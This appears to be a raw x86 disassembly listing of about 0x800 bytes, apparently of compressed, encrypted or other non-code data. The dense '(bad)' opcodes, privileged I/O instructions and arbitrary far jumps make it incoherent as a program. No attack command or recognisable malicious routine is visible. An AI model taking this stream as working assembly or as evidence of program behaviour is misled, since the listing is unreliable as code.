  420141:	mov    ebx,0x5b6c6f8d
  420146:	jno    0x420177
  420148:	push   cs
  420149:	xor    ebp,DWORD PTR [esi]
  42014b:	dec    esi
  42014c:	scas   al,BYTE PTR es:[edi]
  42014d:	push   esi
  42014e:	mov    edi,0x4b05ae7e
  420153:	cmc    
  420154:	cmp    DWORD PTR [ecx-0x6d6c434b],0x195e3889
  42015e:	mov    ebp,0x70b59a7f
  420163:	sbb    ecx,esi
  420165:	outs   dx,BYTE PTR es:[esi]
  420167:	push   ebp
  420168:	ja     0x420186
  42016a:	loope  0x42017c
  42016c:	fmul   QWORD PTR [edi-0xf]
  42016f:	mov    al,ds:0x97b4ec25
  420174:	(bad)  
  420175:	mov    cl,0x2c
  420177:	nop
  420178:	leave  
  420179:	mov    ebp,0x89ee065
  42017e:	or     cl,BYTE PTR [ebp-0x2]
  420181:	mov    al,0x11
  420183:	and    ah,BYTE PTR [edi]
  420185:	test   cl,al
  420187:	pop    ds
  420188:	mov    al,ds:0xe88b0e66
  42018d:	or     BYTE PTR [ecx-0x58],dl
  420190:	cdq    
  420191:	jo     0x4201b0
  420193:	mov    es,esi
  420195:	and    al,0x15
  420197:	test   BYTE PTR ds:0xd1320037,ah
  42019d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42019e:	idiv   BYTE PTR [eax+0x15]
  4201a1:	xchg   dh,dh
  4201a3:	loopne 0x42021a
  4201a5:	fucom  st(6)
  4201a7:	mov    ds:0x764d6d6f,al
  4201ac:	jmp    0x63da:0xdbb750b3
  4201b3:	mov    eax,0xda0b9034
  4201b8:	push   esi
  4201b9:	test   BYTE PTR [ebx-0x75],0x6d
  4201bd:	sbb    edi,DWORD PTR [esi-0x2e067669]
  4201c3:	inc    esi
  4201c4:	fst    QWORD PTR [ecx-0x4b]
  4201c7:	ins    DWORD PTR es:[edi],dx
  4201c8:	iret   
  4201c9:	stos   BYTE PTR es:[edi],al
  4201ca:	sbb    eax,0xc21a79f5
  4201cf:	dec    ebx
  4201d0:	shr    DWORD PTR [ebp+0x164676a2],0x8
  4201d7:	lods   eax,DWORD PTR ds:[esi]
  4201d8:	lea    ebp,[edi-0x7a]
  4201db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201dc:	dec    edx
  4201dd:	(bad)  
  4201de:	cmc    
  4201df:	rcr    ah,0xea
  4201e2:	sub    BYTE PTR [eax-0x5f],0xff
  4201e6:	push   ebx
  4201e7:	xchg   ecx,eax
  4201e9:	cmp    al,0xf
  4201eb:	xchg   esi,esi
  4201ed:	fcmovnu st,st(5)
  4201ef:	adc    DWORD PTR [eax],0xffffffe5
  4201f2:	in     al,dx
  4201f3:	push   0x5c
  4201f5:	push   0xffffffaa
  4201f7:	or     al,BYTE PTR [ebx]
  4201f9:	lea    ecx,[ecx+0x62]
  4201fc:	sar    DWORD PTR [esi],0x23
  4201ff:	or     BYTE PTR [ecx],0x48
  420202:	sub    bl,BYTE PTR [edx+0x3e]
  420205:	jge    0x4201b4
  420207:	pop    esi
  420208:	loopne 0x420258
  42020a:	xchg   ebp,eax
  42020b:	pop    ds
  42020c:	xor    bh,BYTE PTR [ebx-0x6c]
  42020f:	xchg   ebp,eax
  420210:	xor    eax,0x8142b4d0
  420215:	imul   edx,DWORD PTR [ebx+esi*2],0x30a9160b
  42021c:	jge    0x42025f
  42021e:	dec    esp
  42021f:	data16 fstp QWORD PTR es:[edx-0x1e]
  420224:	lahf   
  420225:	or     dh,bl
  420227:	dec    ebx
  420228:	mov    ebp,0xfd47430
  42022d:	push   ecx
  42022e:	lock (bad) 
  420231:	cmc    
  420232:	das    
  420233:	sbb    BYTE PTR [eax],cl
  420235:	xchg   ebx,eax
  420236:	iret   
  420237:	and    DWORD PTR [esi+0x75],esp
  42023a:	js     0x42022b
  42023c:	rol    DWORD PTR [ecx],1
  42023e:	add    al,ch
  420240:	add    DWORD PTR [eax],eax
  420242:	add    al,bh
  420244:	or     BYTE PTR [ebx+esi*2+0x65],cl
  420248:	rol    BYTE PTR ds:0xda2bd981,0x5f
  42024f:	hlt    
  420250:	dec    eax
  420251:	pop    ebx
  420252:	sub    BYTE PTR [ebx-0xefb7e0c],cl
  420258:	sbb    al,BYTE PTR [ecx]
  42025a:	sub    BYTE PTR [esi-0x6b2659c0],cl
  420260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420261:	or     al,BYTE PTR fs:[ebx]
  420264:	es cmp eax,0x99477e44
  42026a:	cld    
  42026b:	jb     0x4202e6
  42026d:	inc    eax
  42026e:	dec    DWORD PTR [eax]
  420270:	cld    
  420271:	sub    edx,DWORD PTR [ebp+0xdc75035]
  420277:	loopne 0x420286
  420279:	push   0xffffffbf
  42027b:	jo     0x4202e8
  42027d:	pop    ecx
  42027e:	sub    ch,BYTE PTR [ebx+0x45]
  420281:	repnz push ds
  420283:	stos   BYTE PTR es:[edi],al
  420284:	adc    ebx,DWORD PTR [ebx-0x13]
  420287:	fcmovnu st,st(3)
  420289:	shl    DWORD PTR [edx-0x3c],0xba
  42028d:	test   BYTE PTR [ebx-0x63c86ce4],0xc0
  420294:	push   ebp
  420295:	retf   
  420296:	mov    esp,0x540a372f
  42029b:	push   esi
  42029c:	inc    ecx
  42029d:	mov    ds,WORD PTR [ebp+0x1dd68efa]
  4202a3:	xor    edi,DWORD PTR [ebp-0x465ad067]
  4202a9:	dec    esp
  4202aa:	pushf  
  4202ab:	mov    ebx,0x75aca9b8
  4202b0:	mov    ecx,0x72fb9954
  4202b5:	mov    DWORD PTR [ecx-0x55f03a9a],esi
  4202bb:	out    dx,al
  4202bc:	sbb    eax,0x94c112f1
  4202c1:	test   ecx,0x268caaa
  4202c7:	in     al,dx
  4202c8:	mov    al,0xfb
  4202ca:	dec    ebp
  4202cb:	cmp    al,BYTE PTR ds:[ecx+edi*8-0x39e24b9e]
  4202d3:	xchg   ebx,eax
  4202d4:	dec    ebx
  4202d5:	push   edx
  4202d6:	or     BYTE PTR [ecx-0x1d3fddd3],cl
  4202dc:	inc    esp
  4202dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202de:	je     0x420356
  4202e0:	jge    0x42027c
  4202e2:	sbb    dh,cl
  4202e4:	inc    ecx
  4202e5:	jnp    0x4202e6
  4202e7:	jb     0x4202bf
  4202e9:	aam    0x52
  4202eb:	mov    esi,0x80f8778a
  4202f0:	sahf   
  4202f1:	test   al,0xfa
  4202f3:	das    
  4202f4:	xchg   esi,eax
  4202f5:	ret    
  4202f6:	sbb    BYTE PTR [esi+esi*4],bh
  4202f9:	push   eax
  4202fa:	jle    0x420285
  4202fc:	jmp    0x420305
  4202fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202ff:	xor    dl,BYTE PTR [edi+edx*2-0x71]
  420303:	adc    eax,0x99272b99
  420308:	pop    esp
  420309:	lods   eax,DWORD PTR gs:[esi]
  42030b:	shr    BYTE PTR [esi],0xcc
  42030e:	sbb    al,0x55
  420310:	xor    bh,BYTE PTR [edi+0x63]
  420313:	xlat   BYTE PTR ds:[ebx]
  420314:	jle    0x420395
  420316:	or     edi,DWORD PTR [ebx+0x36d1c4dc]
  42031c:	push   edx
  42031d:	imul   edi,DWORD PTR [esi*8+0x725c7f66],0x78
  420325:	not    DWORD PTR [ecx+0x5a]
  420328:	jmp    0xced08ab3
  42032d:	jmp    0x7a17:0x666cb3b9
  420334:	ret    0x5334
  420337:	mov    BYTE PTR [edi],ch
  420339:	jp     0x42039f
  42033b:	xchg   ecx,eax
  42033c:	mov    bh,0xf5
  42033e:	inc    ebx
  42033f:	push   esi
  420340:	repz adc ch,BYTE PTR [esi]
  420343:	pushf  
  420344:	lahf   
  420345:	sar    DWORD PTR [ebx+0x46],cl
  420348:	sub    DWORD PTR [ebp-0x58],esi
  42034b:	jno    0x420355
  42034d:	jo     0x42035c
  42034f:	ret    0x93e2
  420352:	jbe    0x420360
  420354:	inc    esp
  420355:	lahf   
  420356:	fld    st(1)
  420358:	fdiv   QWORD PTR [esi]
  42035a:	je     0x4203b7
  42035c:	pop    edi
  42035d:	add    eax,DWORD PTR [esi+edx*2]
  420360:	xor    DWORD PTR [ebp-0x642077f],eax
  420366:	ret    
  420367:	call   0xc170405
  42036c:	mov    WORD PTR [ebx],gs
  42036e:	stos   BYTE PTR es:[edi],al
  42036f:	inc    edx
  420370:	sahf   
  420371:	loop   0x4203d1
  420373:	jnp    0x4203cf
  420375:	push   cs
  420376:	ins    DWORD PTR es:[edi],dx
  420377:	sub    al,0x9b
  420379:	sbb    eax,0x2565cdf5
  42037e:	dec    eax
  42037f:	aaa    
  420380:	mov    eax,DWORD PTR [eax+0x35]
  420383:	dec    eax
  420384:	gs jnp 0x4203f5
  420387:	sbb    esp,DWORD PTR [esi]
  420389:	sbb    eax,0xc14a5f1a
  42038e:	cs dec edx
  420390:	mov    bh,BYTE PTR [esi]
  420392:	out    dx,al
  420393:	lds    esp,FWORD PTR [edx+ebx*1-0x6f]
  420397:	fwait
  420398:	push   edi
  420399:	or     DWORD PTR [edi-0x50],ebx
  42039c:	jp     0x4203cf
  42039e:	test   al,0xad
  4203a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203a1:	or     BYTE PTR [edi-0x58bb9364],ch
  4203a7:	push   cs
  4203a8:	and    BYTE PTR [ecx],dh
  4203aa:	pop    esi
  4203ab:	or     DWORD PTR [ebp-0x47db3172],0x14
  4203b2:	pop    esp
  4203b3:	shl    dl,1
  4203b5:	jl     0x4203cd
  4203b7:	jg     0x420363
  4203b9:	sahf   
  4203ba:	(bad)  
  4203bb:	xlat   BYTE PTR ds:[ebx]
  4203bc:	in     eax,0x37
  4203be:	dec    edi
  4203bf:	cmp    esi,eax
  4203c1:	sub    ebp,edx
  4203c3:	pop    ebp
  4203c4:	xchg   esp,eax
  4203c5:	jg     0x420397
  4203c7:	push   0x4976d22e
  4203cc:	pusha  
  4203cd:	xor    eax,0x7a0e2fb0
  4203d2:	das    
  4203d3:	xchg   esi,eax
  4203d4:	mov    bh,0x2f
  4203d6:	jge    0x42041c
  4203d8:	iret   
  4203d9:	data16 sbb ah,bh
  4203dc:	mov    BYTE PTR [ecx+0x3e],bl
  4203df:	retf   0xb196
  4203e2:	mov    ecx,0x9cb97e6c
  4203e7:	adc    edx,ecx
  4203e9:	inc    ecx
  4203ea:	xor    ebx,DWORD PTR [edi]
  4203ec:	lods   eax,DWORD PTR ds:[esi]
  4203ed:	aad    0xd3
  4203ef:	push   edi
  4203f0:	mul    bl
  4203f2:	daa    
  4203f3:	leave  
  4203f4:	lock sub al,0x14
  4203f7:	mov    ah,0x3a
  4203f9:	dec    ebx
  4203fa:	js     0x420468
  4203fc:	retf   0x305c
  4203ff:	mov    edi,0x8b7f9eae
  420404:	add    al,0x31
  420406:	(bad)  
  420407:	dec    edi
  420408:	sbb    BYTE PTR [esp+eiz*4+0x49],ch
  42040c:	dec    esi
  42040d:	sub    dh,dl
  42040f:	xchg   esi,eax
  420410:	scas   al,BYTE PTR es:[edi]
  420411:	and    ch,BYTE PTR [edx]
  420413:	imul   eax,edx,0x68
  420416:	lods   eax,DWORD PTR ds:[esi]
  420417:	adc    ch,ah
  420419:	push   esp
  42041a:	pop    edi
  42041b:	add    al,0x8
  42041d:	cmp    al,0x83
  42041f:	mov    ds:0xbe1d4c38,eax
  420424:	fisttp QWORD PTR [eax-0x16db4467]
  42042b:	int    0x2d
  42042d:	xchg   ebp,eax
  42042e:	inc    ebx
  42042f:	cmc    
  420430:	sti    
  420431:	fild   QWORD PTR [edi-0x5bdf5fa9]
  420437:	fld    QWORD PTR [edx+0x73]
  42043a:	add    al,0xd7
  42043c:	rol    DWORD PTR [ecx],cl
  42043e:	add    al,ch
  420440:	add    DWORD PTR [eax],eax
  420442:	add    BYTE PTR [eax-0x68],ah
  420445:	jb     0x4203f6
  420447:	call   0x2f49aae4
  42044c:	test   DWORD PTR [ebp-0x430bab0f],ecx
  420452:	push   esi
  420453:	into   
  420454:	push   0x7f
  420456:	push   edi
  420457:	mov    dh,0xb1
  420459:	lock jnp 0x420408
  42045c:	jp     0x4204a5
  42045e:	jmp    0x8ef32981
  420463:	mov    eax,ds:0xe23bb8c9
  420468:	sbb    ebp,edx
  42046a:	jle    0x420427
  42046c:	sub    BYTE PTR [edx],bl
  42046e:	mov    al,ds:0x9fbca583
  420473:	stos   DWORD PTR es:[edi],eax
  420474:	test   al,0x43
  420476:	rol    DWORD PTR [eax-0x8b3143e],cl
  42047c:	push   ebp
  42047d:	fild   QWORD PTR [esi+0xe]
  420480:	mov    ch,0x83
  420482:	add    DWORD PTR [edi-0x7868c028],ebx
  420488:	xchg   BYTE PTR [edx-0xb495588],ch
  42048e:	xor    eax,0x922bec37
  420493:	or     DWORD PTR [ecx+0x55],ebp
  420496:	fiadd  WORD PTR ds:0x7e867a6e
  42049c:	fmul   st(0),st
  42049e:	mov    al,ds:0x4bd63099
  4204a3:	push   esi
  4204a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204a5:	xchg   DWORD PTR [ecx-0x4c],ebx
  4204a8:	dec    edi
  4204a9:	test   BYTE PTR [eax],bh
  4204ab:	clc    
  4204ac:	cmp    edx,esi
  4204ae:	shr    cl,0xe8
  4204b1:	add    al,al
  4204b3:	xchg   ecx,eax
  4204b4:	xor    al,0xc5
  4204b6:	pusha  
  4204b7:	leave  
  4204b8:	enter  0x9a8b,0xe8
  4204bc:	sbb    ebp,DWORD PTR [edx-0x4fdbb9a2]
  4204c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204c3:	sbb    ebp,DWORD PTR [ecx]
  4204c5:	frstor [ebx+0x69]
  4204c8:	push   ebp
  4204c9:	sbb    edx,DWORD PTR [ebx-0x26]
  4204cc:	hlt    
  4204cd:	sbb    cl,BYTE PTR [edi-0x2f67f0dd]
  4204d3:	cli    
  4204d4:	pop    edx
  4204d5:	sub    DWORD PTR [ebx+ebp*1+0x706ce332],edi
  4204dc:	imul   edx,DWORD PTR [edi+0x4ba0df62],0x77
  4204e3:	mov    dh,0xf6
  4204e5:	jg     0x42047a
  4204e7:	xor    eax,0xd679089b
  4204ec:	pop    edx
  4204ed:	shr    BYTE PTR [ebp+0x5d70ecba],cl
  4204f3:	mov    eax,ds:0x3199ee9d
  4204f8:	sub    ax,0xcc1d
  4204fc:	ss inc eax
  4204fe:	loop   0x42053d
  420500:	je     0x420482
  420502:	dec    edx
  420503:	fst    DWORD PTR [ebp-0x2744ce8a]
  420509:	repz mov ebp,DWORD PTR [eax+0x76]
  42050d:	jmp    0x4204e7
  42050f:	sbb    BYTE PTR [edi+0x5c95e7fa],0xba
  420516:	gs (bad) 
  420518:	pmaxub mm2,QWORD PTR [ebx+eiz*2]
  42051c:	loope  0x420559
  42051e:	jae    0x420550
  420520:	adc    DWORD PTR ds:0x5aeaa2c5,0xffffffda
  420527:	add    eax,0xdb72b9b6
  42052c:	lods   al,BYTE PTR ds:[esi]
  42052d:	std    
  42052e:	push   esi
  42052f:	xchg   esi,eax
  420530:	inc    eax
  420531:	or     eax,0x5228912e
  420536:	pop    edx
  420537:	dec    esi
  420538:	sahf   
  420539:	sbb    ch,al
  42053b:	in     al,0xf5
  42053d:	pushf  
  42053e:	pusha  
  42053f:	ins    BYTE PTR es:[edi],dx
  420540:	repz fcomp QWORD PTR [esi]
  420543:	iret   
  420544:	shr    BYTE PTR [edx],1
  420546:	jno    0x4205aa
  420548:	sbb    BYTE PTR [ecx],ch
  42054a:	mov    edi,0x3ea395f8
  42054f:	arpl   WORD PTR [ebx+0x48],bp
  420552:	jmp    0x570aef1c
  420557:	ret    0x7101
  42055a:	sbb    ebx,eax
  42055c:	popf   
  42055d:	sahf   
  42055e:	xor    eax,0x4b3913d0
  420563:	xchg   esp,eax
  420564:	inc    eax
  420565:	jo     0x4205b6
  420567:	jmp    0x4205b6
  420569:	pop    edi
  42056a:	mov    al,0x7f
  42056c:	fdivrp st(2),st
  42056e:	pop    ecx
  42056f:	inc    edx
  420570:	push   esi
  420571:	jns    0x42056d
  420573:	in     eax,0x2d
  420575:	jl     0x4205eb
  420577:	pop    es
  420578:	xor    al,0xc1
  42057a:	push   ebp
  42057b:	(bad)  
  42057c:	cli    
  42057d:	jge    0x42054c
  42057f:	div    ch
  420581:	xor    eax,0x74ac202d
  420586:	int    0xaf
  420588:	push   ecx
  420589:	xchg   DWORD PTR [ebx+eax*1],edi
  42058c:	inc    ecx
  42058d:	inc    esp
  42058e:	in     al,dx
  42058f:	push   ecx
  420590:	cmp    al,bl
  420592:	or     DWORD PTR [esi],eax
  420594:	pusha  
  420595:	js     0x4205e6
  420597:	jmp    0xf99049e7
  42059c:	adc    dh,cl
  42059e:	cmp    DWORD PTR [edx],esp
  4205a0:	cwde   
  4205a1:	pop    ds
  4205a2:	cmp    esi,esi
  4205a4:	dec    esi
  4205a5:	jmp    0x4205d5
  4205a7:	xor    al,0xd0
  4205a9:	mov    edx,0x2dde0f0b
  4205ae:	jmp    0xfd1d:0xcf5955d
  4205b5:	and    eax,0xd52de98f
  4205ba:	sub    al,0xc7
  4205bc:	mov    esp,0xc38834b0
  4205c1:	outs   dx,BYTE PTR ds:[esi]
  4205c2:	shl    cl,cl
  4205c4:	ja     0x42056b
  4205c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205c7:	mov    eax,ds:0xc7292657
  4205cc:	xchg   edx,eax
  4205cd:	cmp    al,BYTE PTR [ecx]
  4205cf:	scas   al,BYTE PTR es:[edi]
  4205d0:	mov    eax,ds:0x3d9ed003
  4205d5:	cli    
  4205d6:	icebp  
  4205d7:	aaa    
  4205d8:	inc    DWORD PTR [edx]
  4205da:	ins    DWORD PTR es:[edi],dx
  4205db:	out    0xe5,eax
  4205dd:	push   ebp
  4205de:	add    DWORD PTR [esi],0x811bc33c
  4205e4:	cmp    ah,al
  4205e6:	adc    al,BYTE PTR [ebx-0x52]
  4205e9:	std    
  4205ea:	fistp  DWORD PTR [edx]
  4205ec:	inc    edi
  4205ed:	lods   eax,DWORD PTR ds:[esi]
  4205ee:	test   DWORD PTR [eax+0x399b538a],eax
  4205f4:	(bad)  
  4205f5:	xlat   BYTE PTR ds:[ebx]
  4205f6:	js     0x42065a
  4205f8:	cwde   
  4205f9:	(bad)  
  4205fa:	outs   dx,BYTE PTR ds:[esi]
  4205fb:	ffree  st(5)
  4205fd:	sub    DWORD PTR ds:0x6b48edde,ebx
  420603:	jl     0x420616
  420605:	mov    ah,0x1c
  420607:	pop    eax
  420608:	cwde   
  420609:	in     eax,dx
  42060a:	mov    dh,0x18
  42060c:	call   0xc292:0xeea829d6
  420613:	data16 sub BYTE PTR [esi+0x67],al
  420617:	push   ss
  420618:	dec    edi
  420619:	cmp    edi,DWORD PTR [ebp-0x7a]
  42061c:	mov    edx,0xa3a672b6
  420621:	push   ecx
  420622:	mov    ebx,0x2a7e88bc
  420627:	imul   BYTE PTR [ecx]
  420629:	sub    eax,0xe764137b
  42062e:	or     esi,edi
  420630:	mov    edi,edi
  420632:	jl     0x42064e
  420634:	repz cld 
  420636:	dec    esp
  420637:	in     al,0xba
  420639:	ds sub eax,0x1d5bf
  42063f:	call   0x4f420645
  420644:	popf   
  420645:	or     eax,0xc7cf63dd
  42064a:	add    ebx,DWORD PTR [edx-0x590664a]
  420650:	ss pop ss
  420652:	mov    BYTE PTR [ebx-0x5a194b02],al
  420658:	ja     0x42067c
  42065a:	outs   dx,BYTE PTR ds:[esi]
  42065b:	call   0xd69e1d0f
  420660:	pop    ss
  420661:	dec    ecx
  420662:	pusha  
  420663:	pop    ebp
  420664:	push   ebx
  420665:	shl    BYTE PTR [esp+ebx*8+0x31b53777],1
  42066c:	jecxz  0x420621
  42066e:	push   edi
  42066f:	loope  0x42069b
  420671:	sti    
  420672:	jne    0x4206dc
  420674:	in     eax,dx
  420675:	sub    bh,bh
  420677:	ficom  DWORD PTR [eax]
  420679:	and    bh,al
  42067b:	xchg   ebp,eax
  42067c:	les    esi,FWORD PTR gs:[edi]
  42067f:	lods   al,BYTE PTR ds:[esi]
  420680:	shr    BYTE PTR [edi],0xbc
  420683:	mov    ds:0x3d26af04,eax
  420688:	ror    BYTE PTR [edx],1
  42068a:	into   
  42068b:	mov    al,0xa6
  42068d:	cs in  al,dx
  42068f:	and    al,0xa9
  420691:	jbe    0x4206e2
  420693:	clc    
  420694:	dec    esp
  420695:	iret   
  420696:	inc    esp
  420697:	mov    edx,0x8812ee16
  42069c:	test   BYTE PTR [edi+0x6f],dh
  42069f:	cmp    dh,BYTE PTR [ecx+0x2bd034af]
  4206a5:	sbb    eax,0x9ec172f
  4206aa:	fstp   st(0)
  4206ac:	jmp    0x420652
  4206ae:	jae    0x42070b
  4206b0:	addr16 (bad) 
  4206b3:	and    al,0x75
  4206b5:	and    edi,DWORD PTR [ebx+0x70]
  4206b8:	fs fwait
  4206ba:	jle    0x4206e7
  4206bc:	xchg   al,al
  4206be:	push   0x6e2fa9db
  4206c3:	dec    BYTE PTR [esp]
  4206c6:	les    eax,FWORD PTR [edx+esi*8+0x3489f066]
  4206cd:	es das 
  4206cf:	add    dh,BYTE PTR [edi+0xc74c6ce]
  4206d5:	jmp    0x4206bf
  4206d7:	std    
  4206d8:	(bad)  
  4206da:	arpl   WORD PTR [eax+0x7a],sp
  4206dd:	retf   0xf48
  4206e0:	jb     0x4206ea
  4206e2:	push   ebp
  4206e3:	sub    edi,edx
  4206e5:	adc    DWORD PTR [ebx-0x74ce6188],ebp
  4206eb:	push   ss
  4206ec:	jno    0x4206ed
  4206ee:	mov    edx,0x11664161
  4206f3:	cmp    eax,0xf7152209
  4206f8:	lahf   
  4206f9:	in     eax,dx
  4206fa:	xor    ebx,edi
  4206fc:	rcl    DWORD PTR [ebp+0x143b0b39],1
  420702:	push   ecx
  420703:	(bad)  
  420704:	scas   al,BYTE PTR es:[edi]
  420705:	adc    BYTE PTR [esi-0x6aeb81bc],0x50
  42070c:	ret    
  42070d:	shr    esi,cl
  42070f:	out    dx,eax
  420710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420711:	in     al,0x9e
  420713:	int3   
  420714:	sbb    eax,0xa4d45f28
  420719:	push   ds
  42071a:	popf   
  42071b:	fistp  WORD PTR [esi-0x31323071]
  420721:	pop    esp
  420722:	test   al,0x3
  420724:	xchg   esi,eax
  420725:	popf   
  420726:	mov    ebx,0x4246f691
  42072b:	pop    ds
  42072c:	call   0xd37c0cfa
  420731:	xor    eax,0x88c5a86a
  420736:	retf   0x3d76
  420739:	ret    0xb652
  42073c:	outs   dx,BYTE PTR ds:[esi]
  42073d:	cdq    
  42073e:	xlat   BYTE PTR ds:[ebx]
  42073f:	xchg   edi,eax
  420740:	cmp    DWORD PTR [ecx],esp
  420742:	(bad)  
  420743:	jmp    0xa42beda1
  420748:	jns    0x42079f
  42074a:	pop    es
  42074b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42074c:	iret   
  42074d:	neg    cl
  42074f:	push   0x70
  420751:	test   BYTE PTR [ebx-0x316f7a30],al
  420757:	sbb    ebx,DWORD PTR [esi+0x32]
  42075a:	mov    ch,0xf3
  42075c:	pusha  
  42075d:	xchg   ebp,eax
  42075e:	in     al,0x3d
  420760:	in     al,0xec
  420762:	or     ebx,DWORD PTR [esi+0x2a]
  420765:	enter  0xc960,0x83
  420769:	fs jp  0x4207d1
  42076c:	rol    BYTE PTR [edi+0x5d7c9340],0x18
  420773:	outs   dx,BYTE PTR ds:[esi]
  420774:	call   0x5cf6:0x568c0b96
  42077b:	adc    eax,0x8d45b715
  420780:	push   ds
  420781:	adc    BYTE PTR [edx-0x1b1f4ade],ch
  420787:	and    eax,DWORD PTR [ecx-0x3861b279]
  42078d:	(bad)  [edx]
  42078f:	xchg   ecx,eax
  420790:	inc    esi
  420791:	ins    DWORD PTR es:[edi],dx
  420792:	mov    dh,0x6c
  420794:	push   es
  420795:	fcom   QWORD PTR ds:0xe513f800
  42079b:	mov    ebx,ecx
  42079d:	ds into 
  42079f:	aam    0x23
  4207a1:	xor    BYTE PTR [esi+0x4e3db66b],bh
  4207a7:	pop    ss
  4207a8:	add    DWORD PTR [eax],ebx
  4207aa:	aad    0x12
  4207ac:	out    0xf,eax
  4207ae:	call   0x42e1:0x4e26ba2f
  4207b5:	and    BYTE PTR [ecx+0x33936ab6],bl
  4207bb:	xlat   BYTE PTR es:[ebx]
  4207bd:	jmp    0xd600:0x1ad84fd3
  4207c4:	xor    eax,ecx
  4207c6:	jmp    0x8e2360a5
  4207cb:	cdq    
  4207cc:	je     0x420793
  4207ce:	je     0x420755
  4207d0:	adc    edi,DWORD PTR [ecx+0xd]
  4207d3:	and    ebx,eax
  4207d5:	imul   esi,DWORD PTR [edi],0xe9738082
  4207db:	sub    al,0xe5
  4207dd:	sbb    ch,BYTE PTR ds:0xd9c4c3c5
  4207e3:	mov    esp,0xc683e7ae
  4207e8:	mov    edi,esp
  4207ea:	mov    BYTE PTR [esi],dl
  4207ec:	rol    DWORD PTR [edx+0x18],0x26
  4207f0:	sbb    dl,bl
  4207f2:	mov    ecx,0xf5540c37
  4207f7:	test   eax,0x2eca1c8d
  4207fc:	fisttp WORD PTR [esp+ebx*2-0x5022a987]
  420803:	jecxz  0x4207e6
  420805:	push   ss
  420806:	jae    0x42085f
  420808:	xchg   BYTE PTR [esi-0x53425e89],ch
  42080e:	lods   al,BYTE PTR ds:[esi]
  42080f:	fldcw  WORD PTR [eax]
  420811:	ins    DWORD PTR es:[edi],dx
  420812:	nop
  420813:	out    0xfb,al
  420815:	imul   edi,DWORD PTR [ebp+0x62892e88],0x3fca12e5
  42081f:	cdq    
  420820:	bound  eax,QWORD PTR [eax+edx*8-0x37]
  420824:	mov    al,ds:0x9da5def7
  420829:	ror    BYTE PTR [eax],cl
  42082b:	daa    
  42082c:	push   ecx
  42082d:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  420837:	bound  ebp,QWORD PTR [edi-0x6a]
  42083a:	xor    DWORD PTR [edi-0x17fffe29],esp
  420840:	add    DWORD PTR [eax],eax
  420842:	add    ah,dl
  420844:	aam    0x78
  420846:	xlat   BYTE PTR ds:[ebx]
  420847:	js     0x420852
  420849:	inc    ecx
  42084a:	xlat   BYTE PTR ds:[ebx]
  42084b:	out    dx,al
  42084c:	cli    
  42084d:	stos   DWORD PTR es:[edi],eax
  42084e:	sub    al,al
  420850:	outs   dx,BYTE PTR ds:[esi]
  420851:	jp     0x420899
  420853:	push   es
  420854:	xchg   ecx,eax
  420855:	mov    al,ds:0x15b795f5
  42085a:	push   ebp
  42085b:	pop    ss
  42085c:	lods   eax,DWORD PTR ds:[esi]
  42085d:	jmp    0x26cb:0x9506eaa
  420864:	int    0x7c
  420866:	iret   
  420867:	and    ebp,DWORD PTR [ebp+0x30]
  42086a:	mov    bl,0xac
  42086c:	sbb    eax,0xb3c5c7fa
  420871:	push   esi
  420872:	add    bh,ch
  420874:	(bad)  
  420875:	lea    ecx,[edx+0x135da65e]
  42087b:	sbb    DWORD PTR [ebp-0x49],0xdd75005f
  420882:	es (bad) 
  420884:	sub    esi,DWORD PTR [eax]
  420886:	mov    al,0x31
  420888:	pop    esi
  420889:	ins    BYTE PTR es:[edi],dx
  42088a:	ja     0x42081d
  42088c:	xchg   ecx,eax
  42088d:	or     al,0x6c
  42088f:	loopne 0x420823
  420891:	pop    edx
  420892:	push   cs
  420893:	lea    edi,[eax]
  420895:	aad    0xe
  420897:	and    eax,0x73fb6ec0
  42089c:	push   esp
  42089d:	popf   
  42089e:	jg     0x420822
  4208a0:	leave  
  4208a1:	sub    bh,ch
  4208a3:	sbb    DWORD PTR [ebp+0x3a109090],esp
  4208a9:	jae    0x420868
  4208ab:	fdivr  DWORD PTR [ebx]
  4208ad:	stc    
  4208ae:	out    0x4b,al
  4208b0:	inc    ebx
  4208b1:	test   BYTE PTR [ecx],dl
  4208b3:	mov    ch,dh
  4208b5:	xchg   edx,eax
  4208b6:	sti    
  4208b7:	repnz imul ebp,DWORD PTR [eax],0xffffffc6
  4208bb:	ror    eax,cl
  4208bd:	or     eax,0xc453bdf8
  4208c2:	jb     0x42092f
  4208c4:	jb     0x42085f
  4208c6:	std    
  4208c7:	nop
  4208c8:	adc    eax,0x5248ffba
  4208cd:	pop    ds
  4208ce:	sahf   
  4208cf:	and    edi,DWORD PTR [esi+0x5d]
  4208d2:	fstp   st(4)
  4208d4:	jg     0x4208f9
  4208d6:	bound  ebx,QWORD PTR [edx+0x18]
  4208d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208da:	push   0x8da21f82
  4208df:	mov    edi,0x8267e2a1
  4208e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208e5:	je     0x42090f
  4208e7:	jp     0x4208f8
  4208e9:	test   al,0xdb
  4208eb:	mov    ch,0xa4
  4208ed:	outs   dx,BYTE PTR ds:[esi]
  4208ee:	retf   0x98f2
  4208f1:	mov    edi,0x87fa27d0
  4208f6:	add    DWORD PTR [esi],ecx
  4208f8:	inc    edx
  4208f9:	jge    0x42095f
  4208fb:	mov    edx,0xbfd7bf52
  420900:	mov    ch,0x43
  420902:	pop    ebp
  420903:	xchg   DWORD PTR [edi-0x7c672468],ecx
  420909:	lahf   
  42090a:	std    
  42090b:	das    
  42090c:	and    BYTE PTR [esi+0x2e],0x78
  420910:	fcmove st,st(0)
  420912:	int3   
  420913:	hlt    
  420914:	jmp    0x3d43:0x14736909
  42091b:	shl    edx,1
  42091d:	adc    al,0x41
  42091f:	int3   
  420920:	or     ecx,edx
